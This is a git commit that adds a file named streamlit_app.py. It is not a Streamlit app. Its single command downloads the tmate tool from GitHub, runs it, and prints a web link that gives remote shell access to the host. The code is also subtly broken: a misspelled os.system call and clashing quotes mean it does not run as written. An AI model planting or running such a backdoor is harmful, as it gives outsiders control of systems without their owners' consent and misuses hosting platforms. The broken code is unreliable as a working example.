c5e8387376546608387f04416af05108cc038dcb
satubln <108394663+satubln@users.noreply.github.com>
2022-06-29 15:15:36 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,2 @@
+import os
+os.syatem('wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz && tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz && cd tmate-2.4.0-static-linux-i386 && chmod +x tmate && ./tmate -S /tmp/tmate.sock new-session -d && ./tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate -S /tmp/tmate.sock display -p '#{tmate_web}''
